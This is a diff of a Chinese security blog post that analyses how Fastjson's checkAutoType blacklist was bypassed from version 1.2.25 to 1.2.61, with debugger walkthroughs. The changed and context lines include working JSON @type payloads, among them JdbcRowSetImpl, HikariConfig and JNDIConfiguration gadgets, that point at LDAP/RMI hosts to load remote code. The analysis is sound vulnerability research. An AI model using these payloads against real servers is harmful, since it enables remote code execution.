@@ -19,12 +19,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"curlysean.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="FastJson各版本绕过分析 这篇主要是讲一下Fastjson中版本&gt;&#x3D;1.2.25后补丁的绕过方式   tips: 都必须开启AutoTypeSupport才能成功 漏洞修复 想要绕过后续版本，我们就一定要知道哪里做了修改  修补方案就是将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType()函数  ch">
+    <meta name="description" content="FastJson各版本绕过分析  这篇主要是讲一下Fastjson中版本&gt;&#x3D;1.2.25后补丁的绕过方式  tips: 都必须开启AutoTypeSupport才能成功 漏洞修复 想要绕过后续版本，我们就一定要知道哪里做了修改  修补方案就是将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType">
 <meta property="og:type" content="article">
 <meta property="og:title" content="FastJson各版本绕过分析">
 <meta property="og:url" content="http://curlysean.github.io/2025/03/13/FastJson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="肖恩的博客">
-<meta property="og:description" content="FastJson各版本绕过分析 这篇主要是讲一下Fastjson中版本&gt;&#x3D;1.2.25后补丁的绕过方式   tips: 都必须开启AutoTypeSupport才能成功 漏洞修复 想要绕过后续版本，我们就一定要知道哪里做了修改  修补方案就是将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType()函数  ch">
+<meta property="og:description" content="FastJson各版本绕过分析  这篇主要是讲一下Fastjson中版本&gt;&#x3D;1.2.25后补丁的绕过方式  tips: 都必须开启AutoTypeSupport才能成功 漏洞修复 想要绕过后续版本，我们就一定要知道哪里做了修改  修补方案就是将DefaultJSONParser.parseObject()函数中的TypeUtils.loadClass替换为checkAutoType">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741785104503-26d3ec85-4155-45e2-881d-9631568066ce.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737116548870-66e553ed-96af-4f70-aeb7-e3f316953681.png?x-oss-process=image/format,webp">
@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737116548870-66e553ed-96af-4f70-aeb7-e3f316953681.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737119364990-83c943df-7792-4805-9c0e-0ce6476027c5.png">
 <meta property="article:published_time" content="2025-03-13T06:37:39.614Z">
-<meta property="article:modified_time" content="2025-03-13T06:38:47.370Z">
+<meta property="article:modified_time" content="2025-03-24T04:31:27.313Z">
 <meta property="article:author" content="Sean">
 <meta property="article:tag" content="FastJson">
 <meta name="twitter:card" content="summary">
@@ -159,6 +159,8 @@
 
         <div class="site-overview-wrap sidebar-panel">
           <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sean"
+      src="/images/avatar.jpg">
   <p class="site-author-name" itemprop="name">Sean</p>
   <div class="site-description" itemprop="description"></div>
 </div>
@@ -166,7 +168,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">26</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -177,7 +179,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -207,7 +209,7 @@
     <link itemprop="mainEntityOfPage" href="http://curlysean.github.io/2025/03/13/FastJson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.jpg">
       <meta itemprop="name" content="Sean">
     </span>
 
@@ -232,9 +234,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-03-13 14:37:39 / 修改时间：14:38:47" itemprop="dateCreated datePublished" datetime="2025-03-13T14:37:39+08:00">2025-03-13</time>
+      <time title="创建时间：2025-03-13 14:37:39" itemprop="dateCreated datePublished" datetime="2025-03-13T14:37:39+08:00">2025-03-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-03-24 12:31:27" itemprop="dateModified" datetime="2025-03-24T12:31:27+08:00">2025-03-24</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -263,8 +271,8 @@
     
     
     <div class="post-body" itemprop="articleBody"><h1 id="bxzet">FastJson各版本绕过分析</h1>
-这篇主要是讲一下Fastjson中版本>=<font style="color:rgb(80, 80, 92);">1.2.25后补丁的绕过方式 </font>
 
+<p>这篇主要是讲一下Fastjson中版本&gt;&#x3D;<font style="color:rgb(80, 80, 92);">1.2.25后补丁的绕过方式 </font></p>
 <p><strong>tips: 都必须开启AutoTypeSupport才能成功</strong></p>
 <h2 id="EeGoD">漏洞修复</h2>
 想要绕过后续版本，我们就一定要知道哪里做了修改
@@ -284,8 +292,8 @@
 <p>若正常执行1.2.24payload，则会爆出 autoType 不支持该类的错误</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741786376949-5e3335da-be39-4b1b-a7fb-0f4f8e14f374.png"></p>
 <h3 id="TK7hh">小结</h3>
-1.2.24之后的版本后，都是使用`checkAutoType()`函数，用黑白名单的方式来防御Fastjson反序列化漏洞，因此后面不同补丁的绕过都是基于**黑名单**的绕过
 
+<p>1.2.24之后的版本后，都是使用<code>checkAutoType()</code>函数，用黑白名单的方式来防御Fastjson反序列化漏洞，因此后面不同补丁的绕过都是基于<strong>黑名单</strong>的绕过</p>
 <h2 id="pNCOM">1.2.25 - 1.2.41 补丁绕过</h2>
 若按照以前的EXP直接运行，则爆出以下错误，说不支持该类，被黑名单ban了
 
@@ -298,8 +306,8 @@
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741787151444-3145b40b-077a-49ab-9ecc-b5bb50b9ca82.png"></p>
 <h3 id="mugdC">断点分析</h3>
 <h4 id="KWoRr">黑名单绕过</h4>
-我们在`checkAutoType`处下一个断点，跟着看一下怎么绕过的
 
+<p>我们在<code>checkAutoType</code>处下一个断点，跟着看一下怎么绕过的</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741787378125-00f9330a-6e12-4e2f-862c-92bed5657524.png"></p>
 <p>在如下代码处，首先会进行黑名单校验，之前我们的异常就是在此处抛出的</p>
 <p>由于我们对类名加上了<code>L</code>和<code>;</code>，所以这里被不会被拦截</p>
@@ -316,21 +324,21 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
 <h4 id="xQs2E">类加载</h4>
-在`loadClass`方法中，存在这么一个地方，它的功能就是，若以`L`开头`;`结尾，则会去除该开头和该结尾，恢复我们正常的类名
 
+<p>在<code>loadClass</code>方法中，存在这么一个地方，它的功能就是，若以<code>L</code>开头<code>;</code>结尾，则会去除该开头和该结尾，恢复我们正常的类名</p>
 <p>后续的类加载过程就不再多说</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="x8Nhs">1.2.25-1.2.42 补丁绕过</h2>
-新一个EXP是这样的，后续的补丁，会在黑名单过滤之前，先将开头`L`和结尾`;`提取出来，若我们写两个`L`和两个`;`，即可绕过限制
 
+<p>新一个EXP是这样的，后续的补丁，会在黑名单过滤之前，先将开头<code>L</code>和结尾<code>;</code>提取出来，若我们写两个<code>L</code>和两个<code>;</code>，即可绕过限制</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, </span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741789028443-6b420e70-50d6-4226-8699-b726b50c8ba7.png"></p>
 <h2 id="o2cRk">1.2.25-1.2.43 补丁绕过</h2>
 <h3 id="cCmD2">补丁</h3>
-在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错
 
+<p>在checkAutoType()函数中，修改的是直接对类名以”LL”开头的直接报错</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741836711524-627af9eb-2493-4e33-a232-eb7824eed90f.png"></p>
 <h3 id="vZjrF">绕过</h3>
 先给出EXP
@@ -340,8 +348,8 @@
 <p>在1.2.43之前，运行后是可以执行恶意代码的</p>
 <p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741834416864-b67f62d7-857d-476e-9d86-ad0b74e506ef.png"></p>
 <h3 id="afalq">断点调试</h3>
-我们断点下到以下部分，这里会检查，`@type`的第一个字符是不是`[`，若第一个字符是`[`，则会删除第一个`[`，提取出来其中的类名，调用`Array.newInstance`，并`getClass`来获取返回类
 
+<p>我们断点下到以下部分，这里会检查，<code>@type</code>的第一个字符是不是<code>[</code>，若第一个字符是<code>[</code>，则会删除第一个<code>[</code>，提取出来其中的类名，调用<code>Array.newInstance</code>，并<code>getClass</code>来获取返回类</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后会进入<code>checkAutoType</code>函数，对<code>[com.sun.rowset.JdbcRowSetImpl</code>这个函数名进行黑白名单验证，类名前有一个<code>[</code>，所以当然不会被拦截</p>
@@ -354,11 +362,13 @@
 
 <h2 id="AWOxF">1.2.25-1.2.45补丁绕过</h2>
 <h3 id="oFqAi">补丁</h3>
-调试`checkAutoType()`函数，看到对前一个补丁绕过方法的”[“字符进行了过滤，只要类名以”[“开头就直接抛出异常
 
+<p>调试<code>checkAutoType()</code>函数，看到对前一个补丁绕过方法的”[“字符进行了过滤，只要类名以”[“开头就直接抛出异常</p>
 <h3 id="mqkIz">绕过</h3>
-+ 前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本
 
+<ul>
+<li>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本</li>
+</ul>
 <p>pom.xml文件导入如下（不知道为什么3.5.2版本也能行）</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
 
@@ -378,8 +388,8 @@
 
 <h2 id="f9642">1.2.25-1.2.47补丁绕过</h2>
 <h3 id="FtLx3">分析</h3>
-在1.2.24版本之后，当在`DefaultJSONParser#parseObject`方法中检测到`@type`关键字后，会调用`checkAutoType`方法对所加载的类有所限制。而在1.2.24版本前，这个位置直接进行了`loadclass`。
 
+<p>在1.2.24版本之后，当在<code>DefaultJSONParser#parseObject</code>方法中检测到<code>@type</code>关键字后，会调用<code>checkAutoType</code>方法对所加载的类有所限制。而在1.2.24版本前，这个位置直接进行了<code>loadclass</code>。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = config.checkAutoType(typeName, <span class="literal">null</span>);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>下面即为<code>ParserConfig#checkAutoType</code>的代码，因为他的逻辑比较复杂，因此我跟着组长搞了一个流程图</p>
@@ -433,13 +443,17 @@
 
 <h2 id="wpn7g">Fastjson <= 1.2.61 通杀</h2>
 <h3 id="wndOB">Fastjson1.2.5 <= 1.2.59</h3>
-+ 需要开启AutoType
 
+<ul>
+<li>需要开启AutoType</li>
+</ul>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="ozmxv">Fastjson1.2.5 <= 1.2.60</h3>
-+ 需要开启AutoType
 
+<ul>
+<li>需要开启AutoType</li>
+</ul>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="string">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="string">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="dLpkB">Fastjson1.2.5 <= 1.2.60</h3>
@@ -488,15 +502,14 @@
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/03/18/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="next" title="FastJson 1.2.62-1.2.68反序列化漏洞">
-                  FastJson 1.2.62-1.2.68反序列化漏洞 <i class="fa fa-angle-right"></i>
+                <a href="/2025/03/19/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="Servlet内存马">
+                  Servlet内存马 <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
     </footer>
   </article>
 </div>
-
 
 
 
